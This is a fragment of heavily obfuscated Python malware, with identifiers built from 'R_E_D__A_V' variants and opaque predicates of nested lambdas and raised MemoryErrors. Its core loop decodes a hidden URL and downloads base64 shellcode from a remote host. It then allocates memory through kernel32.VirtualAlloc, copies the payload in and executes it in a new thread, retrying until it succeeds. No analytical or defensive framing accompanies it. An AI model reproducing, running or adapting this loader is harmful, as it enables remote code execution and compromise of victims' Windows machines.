                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1716: _1716 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _37:
        try:
            raise MemoryError(__5190902590211)
        except MemoryError as __6762228731688:
            if __6762228731688.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __6762228731688.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3260512504940 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xb1\xa0@82\xe5'))()
try:
    match '102' == '19':
        case True:
            raise MemoryError([True])
        case False:
            _134 = [[True], [False]]
            R_E_D__A_V______(['_174'])
    raise MemoryError([True])
except MemoryError as _1814:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _26: _26 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _187 = [[(lambda : (lambda _1219: _1219 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1913: _1913 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _717: _717 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _68:
        while (lambda : (lambda _45: _45 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyu'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyB'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue